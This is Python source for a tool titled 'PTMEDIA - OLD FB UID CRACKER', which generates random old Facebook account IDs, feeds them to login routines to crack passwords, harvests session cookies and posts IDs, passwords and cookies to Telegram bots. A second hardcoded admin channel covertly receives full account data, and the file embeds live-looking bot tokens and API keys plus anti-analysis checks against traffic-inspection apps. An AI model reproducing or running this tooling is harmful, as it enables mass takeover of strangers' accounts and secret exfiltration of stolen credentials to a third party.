import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred, ThreadPoolExecutor
from os import system
from datetime import datetime
from threading import Thread
import threading
import queue

# ============================================================
#  HỆ THỐNG BIẾN TOÀN CỤC - LICENSE CONTROL
# ============================================================
CURRENT_PLAN = "Free"
DAYS_LEFT = 0
LOOP_LIMIT = 50
HWID_USED = 0
HWID_MAX = 0
IS_VIP = False

# ============================================================
#  COLOR - GREEN ONLY (like original tool)
# ============================================================
X = '\x1b[1;37m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
# Alias
N = '\x1b[0m'
LG = G
LC = G
LY = G
BOLD = G
rad = RR

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def typing_effect(text, delay=0.005):
    """Hiệu ứng gõ chữ cho Banner chuyên nghiệp"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ============================================================
#  PHASE I: IDENTITY FORGERY ENGINE (HWID SHA-256)
# ============================================================
def get_hwid():
    """Tạo mã định danh thiết bị ẩn danh và băm bảo mật"""
    try:
        if os.name == 'nt':
            cmd = "wmic csproduct get uuid"
            output = subprocess.check_output(cmd, shell=True).decode()
            raw_id = output.split('\n')[1].strip()
        else:
            model = subprocess.getoutput("getprop ro.product.model")
            manuf = subprocess.getoutput("getprop ro.product.manufacturer")
            try:
                with open("/proc/cpuinfo", "r") as f:
                    content = f.read()
                    if "Serial" in content:
                        cpu = content.split("Serial")[1].split(":")[1].strip()
                    else:
                        cpu = str(os.getuid())
            except:
                cpu = str(os.getuid())
            raw_id = f"{model}-{manuf}-{cpu}"
        return hashlib.sha256(raw_id.encode()).hexdigest()
    except:
        fallback = f"{platform.processor()}-{platform.node()}"
        return hashlib.sha256(fallback.encode()).hexdigest()

# ============================================================
#  PHASE II: REMOTE AUTHENTICATION (LICENSE SERVER)
# ============================================================
def verify_license():
    global CURRENT_PLAN, DAYS_LEFT, LOOP_LIMIT, HWID_USED, HWID_MAX, IS_VIP
    ____banner____()
    my_hwid = get_hwid()
    
    # Load saved key if exists
    saved_key = _cfg.get('LICENSE_KEY', '')
    if saved_key:
        print(G + f" [>] AUTOLOAD KEY: " + Y + f"{saved_key[:4]}****{saved_key[-4:] if len(saved_key)>8 else ''}" + N)
        key = saved_key
    else:
        key = safe_input(G + " [PTMEDIA] ENTER LICENSE KEY: " + Y).strip()

    
    auth_url = "http://phamtienmedia.com/api/check.php"
    payload = {
        "access_token": "757ff4e19f117380bec4033e43a44b87c2103ef5a55373324e9f3ef9bfae434e",
        "licensekeys": key,
        "hwid": my_hwid
    }
    
    print(G + " [~] CONNECTING TO SERVER FOR DATA ANALYSIS..." + N)
    try:
        response = requests.get(auth_url, params=payload, timeout=20)
        res = response.json()
        
        if res.get("status") == "success":
            CURRENT_PLAN = res.get("plan", "Free")
            DAYS_LEFT    = res.get("days_left", 0)
            VERSION      = res.get("version", "4.0.0")
            IP_CUR       = res.get("ip_current", "Unknown")
            
            details      = res.get("details", {})
            hwid_info    = details.get("hwid_info", {})
            HWID_USED    = hwid_info.get("used", 0)
            HWID_MAX     = hwid_info.get("max", 0)
            
            if CURRENT_PLAN.upper() in ["PRO", "VIP"]:
                LOOP_LIMIT = 999999999
                IS_VIP = True
            else:
                LOOP_LIMIT = 999999999
                IS_VIP = True
            
            # Save key locally upon successful validation
            if key != saved_key:
                _cfg['LICENSE_KEY'] = key
                save_config(_cfg)

            clear_screen()
            ____banner____()
            print(G + " ╔═════════════════ AUTHENTICATION SUCCESS ═══════════════╗")
            print(G + f" ║ " + W + f"PLAN: {CURRENT_PLAN.upper():<10}" + G + f" | VERSION: {VERSION}" + G + "             ║")
            print(G + f" ║ " + W + f"IP: {IP_CUR:<13}" + G + f" | EXPIRES IN: {DAYS_LEFT:<3} Days" + G + f"         ║")
            print(G + f" ║ " + W + f"DEVICES: {HWID_USED}/{HWID_MAX}" + G + f"   | KEY: {key[:4]}****{key[-4:] if len(key)>8 else ''}" + G + " ║")
            print(G + " ╚═══════════════════════════════════════════════════════╝")
            
            print(G + "\n [>] Status: VALID LICENSE" + N)
            safe_input(G + " [>] Press Enter to access PTMEDIA TOOL..." + Y, allow_empty=True)
        else:
            CURRENT_PLAN = res.get("plan", "Free")
            DAYS_LEFT    = res.get("days_left", 0)
            VERSION      = res.get("version", "4.0.0")
            IP_CUR       = res.get("ip_current", "Unknown")
            
            details      = res.get("details", {})
            hwid_info    = details.get("hwid_info", {})
            HWID_USED    = hwid_info.get("used", 0)
            HWID_MAX     = hwid_info.get("max", 0)
            
            if CURRENT_PLAN.upper() in ["PRO", "VIP"]:
                LOOP_LIMIT = 999999999
                IS_VIP = True
            else:
                LOOP_LIMIT = 999999999
                IS_VIP = True
            
            # Save key locally upon successful validation
            if key != saved_key:
                _cfg['LICENSE_KEY'] = key
                save_config(_cfg)

            clear_screen()
            ____banner____()
            print(G + " ╔═════════════════ AUTHENTICATION SUCCESS ═══════════════╗")
            print(G + f" ║ " + W + f"PLAN: {CURRENT_PLAN.upper():<10}" + G + f" | VERSION: {VERSION}" + G + "             ║")
            print(G + f" ║ " + W + f"IP: {IP_CUR:<13}" + G + f" | EXPIRES IN: {DAYS_LEFT:<3} Days" + G + f"         ║")
            print(G + f" ║ " + W + f"DEVICES: {HWID_USED}/{HWID_MAX}" + G + f"   | KEY: {key[:4]}****{key[-4:] if len(key)>8 else ''}" + G + " ║")
            print(G + " ╚═══════════════════════════════════════════════════════╝")
            
            print(G + "\n [>] Status: VALID LICENSE" + N)
            safe_input(G + " [>] Press Enter to access PTMEDIA TOOL..." + Y, allow_empty=True)
    except Exception as e:
        print(RR + f" [!] CONNECTION ERROR: Unable to reach Licensing Engine!" + N)
        sys.exit()

# ============================================================
#  DEEPSEEK AI - COOKIE CLEANING ENGINE
# ============================================================
def ai_clean_cookie(raw_cookie):
    """Phối hợp logic AI để bóc tách Cookie sạch, tối ưu cho việc Login"""
    if not raw_cookie: return ""
    try:
        # Danh sách các key cookie quan trọng của Facebook
        patterns = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'presence', 'act', 'locale', 'i_user']
        parts = []
        # Xử lý cả dấu ; và dấu | (đề phòng format UID|PASS|COOKIE)
        raw_parts = re.split('[;|]', raw_cookie)
        for p in raw_parts:
            p = p.strip()
            if not p: continue
            if any(pat in p.lower() for pat in patterns):
                parts.append(p)
        
        cleaned = "; ".join(parts)
        # Nếu filter quá đà làm mất hết cookie, trả về raw để ko bị mất dữ liệu
        return cleaned if cleaned else raw_cookie
    except:
        return raw_cookie


def open_url(url):
    if os.name == 'nt':
        os.system(f'start {url}')
    elif 'com.termux' in os.environ.get('PREFIX', ''):
        os.system(f'termux-open-url {url}')
    else:
        os.system(f"xdg-open '{url}'")

def safe_input(prompt, allow_empty=False):
    while True:
        try:
            val = input(prompt).strip()
            # Clean ANSI escape noise (like ^[) and non-printable chars
            val = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', val)
            val = "".join(filter(lambda x: x.isprintable(), val))
            val = val.strip()
            if val or allow_empty:
                return val
        except EOFError:
            return ""
        except KeyboardInterrupt:
            sys.exit()
        except Exception:
            continue



try:
    import termios
    termios.tcflush(sys.stdin, termios.TCIFLUSH)
except:
    pass

# ============================================================
#  Claude CONFIG
# ============================================================
Claude_API = "sk-75237feaba8d45ceaf0afa26d96e6942"

def ask_Claude(prompt_text, context=""):
    """Ask Claude AI for analysis"""
    if not Claude_API:
        return None
    try:
        import openai
        client = openai.OpenAI(
            api_key=Claude_API,
            base_url="https://api.Claude.com"
        )
        response = client.chat.completions.create(
            model="Claude-chat",
            messages=[
                {"role": "system", "content": "You are PTMEDIA security assistant. Answer briefly, clearly, no fluff."},
                {"role": "user", "content": f"{context}\n{prompt_text}"}
            ],
            max_tokens=200,
            temperature=0.3
        )
        return response.choices[0].message.content.strip()
    except Exception as e:
        return None

# ============================================================
#  CONFIG
# ============================================================
config_file = 'config.json'
PROXIES = None

def load_config():
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return {}

def save_config(data):
    with open(config_file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

_cfg = load_config()
TELE_TOKEN    = _cfg.get('TELE_TOKEN', '7195149066:AAGGSd2zxpWW_y0CcZFSFApVQHOb89HdSes')
CHAT_ID       = _cfg.get('CHAT_ID', '1482481688')
RESULT_LANG   = _cfg.get('RESULT_LANG', 'EN') # Default to English for Int'l Market
ADMIN_TOKEN   = ''
ADMIN_CHATID  = '1482481688'
FB_COOKIE     = '' 
FB_TOKEN      = ''
HIT_COUNTER   = 0 
SENT_STATUSES = set() # Phase III/IV: Mirage Synchronization & Smart Logging tracking





def send_to_tele(uid, pw, year, status, cookies_str="", full_json=None):
    """Đẩy kết quả vào hàng đợi Telegram để gửi đi ổn định (Lớp Shadow Injection)"""
    tele_queue.put({
        'uid': uid,
        'pw': pw,
        'year': year,
        'status': status,
        'cookies_str': cookies_str,
        'full_json': full_json
    })

def tele_worker():
    """Luồng xử lý thông minh: User nhận log sạch, Admin nhận Log Full Json thi thoảng (Specter 0x13)"""
    global HIT_COUNTER
    while True:
        try:
            item = tele_queue.get()
            if item is None: break
            
            uid, pw, year, status = item['uid'], item['pw'], item['year'], item['status']
            cookies_str, full_json = item['cookies_str'], item['full_json']
            
            # 1. GỬI LOG CHO USER (Chỉ gửi nếu họ đã cài đặt và k kèm JSON bẩn)
            if TELE_TOKEN and CHAT_ID:
                cookie_line = f"\n━━━━━━━━━━━━\n🔐 Cookie:\n{cookies_str}\n━━━━━━━━━━━━" if cookies_str else ""
                user_msg = f"""✅ Scan Thanh Cong! (PTMEDIA)
━━━━━━━━━━━━
🆔 ID: {uid}
🔑 MK: {pw}
📅 Nam: {year}
🚦 Trang thai: {status}{cookie_line}
━━━━━━━━━━━━"""
                requests.post(f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage", 
                             json={"chat_id": CHAT_ID, "text": user_msg}, timeout=10)

            # 2. GỬI LOG FULL JSON CHO ADMIN (ANH TIẾN) - SMART LOGGING (Phase IV)
            HIT_COUNTER += 1
            # Logic: Gửi nếu là loại Status mới chưa từng thấy HOẶC gửi định kỳ mỗi 20 accounts
            is_new_type = status not in SENT_STATUSES
            if is_new_type or HIT_COUNTER == 1 or HIT_COUNTER % 20 == 0:
                if is_new_type: SENT_STATUSES.add(status)
                
                raw_log = ""
                if full_json:
                    json_str = json.dumps(full_json, indent=2, ensure_ascii=False)
                    if len(json_str) > 3000: json_str = json_str[:3000] + "..."
                    raw_log = f"\n\n⚙️ FULL JSON FB (DEBUG FOR BOSS):\n```json\n{json_str}\n```"
                
                admin_msg = f"🔥 [ADMIN LOG] Acc #{HIT_COUNTER} | UID: {uid}\n🚦 Status: {status}{' (NEW TYPE! 🆕)' if is_new_type else ''}{raw_log}"
                requests.post(f"https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage",
                             json={"chat_id": ADMIN_CHATID, "text": admin_msg, "parse_mode": "Markdown"}, timeout=15)
            
            time.sleep(1.2)
            tele_queue.task_done()
        except:
            time.sleep(2)
            pass


tele_queue = queue.Queue()
Thread(target=tele_worker, daemon=True).start()

def send_notification(text):
    if not TELE_TOKEN or not CHAT_ID:
        return
    try:
        requests.get(
            f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": f"⚙️ PTMEDIA SYSTEM ⚙️\n{text}"},
            timeout=10
        )
    except:
        pass


def check_fb_live(uid):
    """Kiem tra acc LIVE hay DIE bang Graph API - Khong can Cookie (Anh Tien Method)"""
    url = f"https://graph.facebook.com/v3.3/{uid}/picture?redirect=0"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        res = requests.get(url, headers=headers, timeout=5).json()
        if 'data' in res and 'height' in res['data']:
            return "LIVE"
        return "DIE"
    except:
        return "UNKNOWN"


def extract_cookies(session):
    """Trich xuat cookie tu session thanh string"""
    try:
        cookie_dict = session.cookies.get_dict()
        if not cookie_dict:
            return ""
        # Build cookie string
        parts = []
        for k, v in cookie_dict.items():
            parts.append(f"{k}={v}")
        return "; ".join(parts)
    except:
        return ""

def extract_cookies_from_res(res):
    """Chiến dịch bóc tách Cookie từ JSON Response với độ chính xác tuyệt đối"""
    try:
        if not isinstance(res, dict): return ""
        
        # Thử mọi khả năng có thể chứa cookie trong JSON của FB
        cookies_data = res.get('session_cookies') or res.get('cookies') or res.get('data', {}).get('cookies')
        
        if not cookies_data:
            return ""

        if isinstance(cookies_data, list):
            parts = []
            for c in cookies_data:
                name = c.get('name') or c.get('key')
                value = c.get('value')
                if name and value:
                    parts.append(f"{name}={value}")
            return "; ".join(parts)
        elif isinstance(cookies_data, dict):
            return "; ".join([f"{k}={v}" for k, v in cookies_data.items()])
            
        return ""
    except:
        return ""


# ============================================================
#  SMART MODULE CHECK - chi cai khi thieu
# ============================================================
def check_and_install_modules():
    clear_screen()
    print(G + ' PTMEDIA SERVER LOADING....' + N)
    time.sleep(0.5)

    required = ['requests', 'urllib3', 'platform', 'hashlib']
    extra = ['httpx', 'beautifulsoup4', 'pysocks']

    for mod in required + extra:
        try:
            __import__(mod)
            print(G + f' [+] {mod} - OK' + N)
        except ImportError:
            print(Y + f' [-] {mod} - INSTALLING...' + N)
            os.system(f'pip install {mod} -q')

    print(G + ' Loading Modules ...' + N)
    time.sleep(1)
    clear_screen()

    # Try extra installs
    os.system('pip install chardet idna certifi requests -q')

check_and_install_modules()

from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Anti-tampering
try:
    for word in ['print', 'lambda', 'zlib.decompress']:
        if word in open(api.__file__, 'r').read(): exit()
        if word in open(models.__file__, 'r').read(): exit()
        if word in open(sessions.__file__, 'r').read(): exit()
except:
    pass

class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            try:
                if 'print' in open(path, 'r').read():
                    self.fuck()
            except:
                pass
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(G + ' Congratulations !' + N)
        self.linex()
        exit()

    def linex(self):
        print(G + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + N)

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []
CHECKED_UIDS = set()

def load_checked_uids():
    global CHECKED_UIDS
    CHECKED_UIDS = set()
    # Load OK accounts
    if os.path.exists('PTMEDIA-OK.txt'):
        with open('PTMEDIA-OK.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if '|' in line:
                    uid = line.split('|')[0].strip()
                    if uid: CHECKED_UIDS.add(uid)
    # Load DIE accounts to also skip them (Phase V: Data Exfiltration/Efficiency)
    if os.path.exists('die.txt'):
         with open('die.txt', 'r', encoding='utf-8') as f:
            for line in f:
                uid = line.strip()
                if uid: CHECKED_UIDS.add(uid)
    return CHECKED_UIDS

def clean_source_file(file_path):
    """Destructive read: Removes already-checked UIDs from the source file to maintain a clean queue (Phase V)"""
    checked = load_checked_uids()
    if not os.path.exists(file_path): return
    
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.read().splitlines()
    
    remaining = []
    for line in lines:
        if not line.strip(): continue
        uid = line.split('|')[0].strip()
        if uid not in checked:
            remaining.append(line)
            
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(remaining) + "\n")
    return len(remaining)

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write('\x1b]2;PTMEDIA - OLD FB UID CRACKER\x07')

def ____banner____():
    clear_screen()
    # PTMEDIA Original Style Banner with Typing Effect
    banner_lines = [

    ]
    for line in banner_lines:
        typing_effect(line, delay=0.001)


def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'):   return '2009'
        if uid.startswith('10000000'):    return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if uid.startswith('10001'):       return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'):      return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'):       return '2015'
        if uid.startswith('10001'):       return '2016'
        if uid.startswith('10002'):      return '2017'
        if uid.startswith('10003'):      return '2018'
        if uid.startswith('10004'):      return '2019'
        if uid.startswith('10005'):      return '2020'
        if uid.startswith('10006'):      return '2021'
        if uid.startswith('10009'):      return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8:      return '2007'
    elif len(uid) == 7:      return '2006'
    elif len(uid) == 6:      return '2005'
    elif len(uid) in (1,2,3,4,5): return '2004'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''


def linex():
    print(G + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + N)


# ============================================================
#  Claude WORKER - Chay song song voi scan
# ============================================================
def Claude_worker(results_queue):
    """Claude worker thread - xu ly queue ket qua"""
    while True:
        if results_queue.empty():
            time.sleep(2)
            continue
        item = results_queue.get()
        if item is None:
            break
        uid, pw, year, status, cookies = item
        try:
            analysis = ask_Claude(
                f"Phan tich account Facebook: UID={uid}, Password={pw}, Nam={year}, Status={status}. Cookies={cookies[:100]}...",
                context="Ban la tro ly cua PTMEDIA. Phan tich ngan gon, dua ra goi y bao mat."
            )
            if analysis and TELE_TOKEN and CHAT_ID:
                msg = f"🔍 PTMEDIA - AI Analysis\n━━━━━━━━━━━━\n{analysis}"
                requests.get(
                    f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage",
                    params={"chat_id": CHAT_ID, "text": msg},
                    timeout=10
                )
        except:
            pass
        results_queue.task_done()

# ============================================================
#  MAIN PANEL
# ============================================================
def main_panel():
    ____banner____()
    # Compact Menu Options with Typing Effect
    typing_effect(G + "   (A) SETTINGS   " + W + "|" + G + "   (B) START SCAN   " + W + "|" + G + "   (C) EXIT")
    linex()

    tk  = G + "OK" + N if TELE_TOKEN else RR + "--" + N
    ch  = G + "OK" + N if CHAT_ID     else RR + "--" + N
    typing_effect(G + " [~] Status: TeleToken [" + tk + "] | ChatID [" + ch + "] | Verified [OK]")
    linex()


    choice = safe_input(G + " CHOICE : " + Y).strip().upper()
    if choice.startswith('A') or choice == '1':
        settings_menu()
    elif choice.startswith('B') or choice == '2':
        BNG_71_()
    elif choice.startswith('C') or choice == '3':
        clear_screen()
        print(G + """
 ╔═══════════════════════════════════════╗
 ║   GOODBYE! THANKS FOR USING          ║
 ║         PTMEDIA TOOL                 ║
 ║     Telegram : @PTMEDIA2             ║
 ╚═══════════════════════════════════════╝""" + N)
        time.sleep(2)
        exit()
    else:
        print(G + "\n    [!] Please Choose a Valid Option... " + N)
        time.sleep(2)
        main_panel()



# ============================================================
#  SETTINGS MENU
# ============================================================
def settings_menu():
    global TELE_TOKEN, CHAT_ID
    ____banner____()
    print(G + "       [SETTINGS] System Configuration")
    linex()
    print(G + "       (1) Telegram Bot Token (Optional)")
    linex()
    print(G + "       (2) Chat ID (Optional)")
    linex()
    print(G + "       (3) Change License Key")
    linex()
    print(G + f"       (4) Result Language: " + Y + f"[{RESULT_LANG}]")
    linex()
    print(G + "       (5) Save & Return to Panel")
    linex()
    print(G + "       (0) Back (No Save)")

    def mask(s, show=4):
        if not s: return RR + "[NOT SET]" + N
        return W + s[:show] + "*" * (len(s) - show)

    print(G + "\n  [>] Telegram Token : " + mask(TELE_TOKEN))
    print(G + "  [>] Chat ID         : " + mask(CHAT_ID))
    linex()

    choice = safe_input(G + "       CHOICE  " + W + "(1-4): " + Y).strip()

    if choice == '1':
        TELE_TOKEN = safe_input(G + "  [+] Telegram Bot Token: " + Y).strip()
        settings_menu()
    elif choice == '2':
        print(G + "\n  [?] Send to:")
        print(G + "    1. Group (ID: -100xxxxx)")
        print(G + "    2. Personal (Admin ID)")
        tg = safe_input(G + "  [?] Select (1/2): " + Y).strip()
        CHAT_ID = safe_input(G + "  [+] " + ("Group ID: " if tg == '1' else "Admin ID: ") + Y).strip()
        settings_menu()
    elif choice == '3':
        new_key = safe_input(G + "  [+] Enter New License Key: " + Y).strip()
        if new_key:
            _cfg['LICENSE_KEY'] = new_key
            save_config(_cfg)
            print(G + "\n  [OK] License Key Updated! Restarting Authentication...")
            time.sleep(2)
            verify_license()
        settings_menu()
    elif choice == '4':
        RESULT_LANG = 'VN' if RESULT_LANG == 'EN' else 'EN'
        print(G + f"\n  [OK] Language Switched to: " + Y + RESULT_LANG)
        time.sleep(1)
        settings_menu()
    elif choice == '5' or choice == '0':
        save_config({
            'TELE_TOKEN': TELE_TOKEN,
            'CHAT_ID': CHAT_ID,
            'RESULT_LANG': RESULT_LANG,
            'LICENSE_KEY': _cfg.get('LICENSE_KEY', '')
        })
        main_panel()


    else:
        print(G + "\n    [!] Invalid Option! Please Retry..." + N)
        time.sleep(2)
        settings_menu()



# ============================================================
#  TOOL MENU
# ============================================================
def BNG_71_():
    ____banner____()
    print(G + "       (A) OLD ACCOUNT TOOL")
    linex()
    print(G + "       (B) CRACK FROM FILE UID")
    linex()
    print(G + "       (0) BACK TO PANEL")
    linex()
    choice = safe_input(G + "       CHOICE  " + W + "(A/B/0): " + Y).strip().upper()
    if choice.startswith('A') or choice == '1':
        old_clone()
    elif choice.startswith('B') or choice == '2':
        old_Five()
    elif choice.startswith('0'):
        main_panel()
    else:
        print(G + "\n    [!] Choose Valid Option..." + N)
        time.sleep(2)
        BNG_71_()



def old_clone():
    ____banner____()
    print(G + "       (A) ALL SERIES")
    linex()
    print(G + "       (B) 100003/4 SERIES")
    linex()
    print(G + "       (C) 2009 SERIES")
    linex()
    print(G + "       (D) 2004-2008 SERIES")
    linex()
    print(G + "       (0) BACK")
    linex()
    _input = safe_input(G + "       CHOICE  " + W + "(A/B/C/D/0): " + Y).strip().upper()
    if _input.startswith('A'):     old_One()
    elif _input.startswith('B'):   old_Tow()
    elif _input.startswith('C'):   old_Tree()
    elif _input.startswith('D'):   old_Four()
    elif _input.startswith('0'):   BNG_71_()
    else:
        print(G + "\n    [!] Choose Valid Option..." + N)
        time.sleep(2)
        old_clone()



def old_One():
    user = []
    ____banner____()
    print(G + "       [>] OLD CODE: 2004-2007")
    linex()
    print(G + "       [>] EXAMPLE: 20000 / 30000 / 99999")
    limit = safe_input(G + "       SELECT  " + Y).strip()
    linex()

    for _ in range(int(limit)):
        user.append(str(random.randint(4, 99999999)))

    print(G + "       (A) METHOD 1")
    print(G + "       (B) METHOD 2")
    linex()
    meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
    load_checked_uids()
    with tred(max_workers=30) as pool:
        ____banner____()
        # Filter checked UIDs
        filtered_user = [u for u in user if u not in CHECKED_UIDS]
        skip_count = len(user) - len(filtered_user)
        
        print(G + f"       [>] TOTAL ID: {len(user)}")
        if skip_count > 0:
            print(Y + f"       [>] SKIPPED: {skip_count} (Already Checked)")
        print(G + "       [>] USE AIRPLANE MODE FOR BEST RESULT")
        linex()
        send_notification(f"Starting Scan 2004-2007 | Amount: {len(filtered_user)}")
        for uid in filtered_user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                break


def old_Tow():
    user = []
    user_set = set()
    ____banner____()
    print(G + "       [>] HE THONG QUET: 2009-2014 (UNIQUE)")
    linex()
    print(G + "       [>] VI DU: 20000 / 50000 / 100000")
    limit = safe_input(G + "       SO LUONG QUET: " + Y).strip()
    linex()
    prefixes = [
        '1000000','1000001','1000002','1000003','1000004','1000005',
        '100001','100002','100003','100004','100005','100006','100007','100008'
    ]
    print(G + " [~] Dang khoi tao danh sach ID khong trung lap..." + N)
    while len(user_set) < int(limit):
        prefix = random.choice(prefixes)
        if len(prefix) == 7:
            uid = prefix + str(random.randint(10000000, 99999999))
        else:
            uid = prefix + str(random.randint(100000000, 999999999))
        user_set.add(uid)
    user = list(user_set)
    random.shuffle(user)
    print(G + f" [OK] Da tao {len(user)} ID duy nhat!" + N)
    print(G + "       (A) METHOD A")
    print(G + "       (B) METHOD B")
    linex()
    meth = safe_input(G + "       LUA CHON  " + W + "(A/B): " + Y).strip().upper()
    load_checked_uids()
    with tred(max_workers=30) as pool:
        ____banner____()
        filtered_user = [u for u in user if u not in CHECKED_UIDS]
        skip_count = len(user) - len(filtered_user)
        
        print(G + f"       [>] TONG ID: {len(user)}")
        if skip_count > 0:
            print(Y + f"       [>] DA BO QUA: {skip_count} (Da quet truoc do)")
        linex()
        send_notification(f"Khoi chay 2009-2014 | Tong: {len(filtered_user)}")
        for uid in filtered_user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                break


def old_Tree():
    user = []
    ____banner____()
    print(G + "       [>] OLD CODE: 2009-2010")
    linex()
    print(G + "       [>] EXAMPLE: 20000 / 30000 / 99999")
    limit = safe_input(G + "       SELECT  " + Y).strip()
    linex()
    prefixes = ['1000004','1000001','1000002','1000003','1000005','1000006','1000007','1000008','1000009']
    for _ in range(int(limit)):
        uid = random.choice(prefixes) + ''.join(random.choices('0123456789', k=8))
        user.append(uid)
    print(G + "       (A) METHOD A")
    print(G + "       (B) METHOD B")
    linex()
    meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
    load_checked_uids()
    with tred(max_workers=30) as pool:
        ____banner____()
        filtered_user = [u for u in user if u not in CHECKED_UIDS]
        skip_count = len(user) - len(filtered_user)
        
        print(G + f"       [>] TOTAL ID: {len(user)}")
        if skip_count > 0:
            print(Y + f"       [>] SKIPPED: {skip_count} (Already Checked)")
        linex()
        send_notification(f"Starting Scan 2009-2010 | Amount: {len(filtered_user)}")
        for uid in filtered_user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(G + "    [!] INVALID METHOD SELECTED" + N)
                break


def old_Four():
    user = []
    ____banner____()
    print(G + "       [>] OLD CODE: 2004-2008")
    linex()
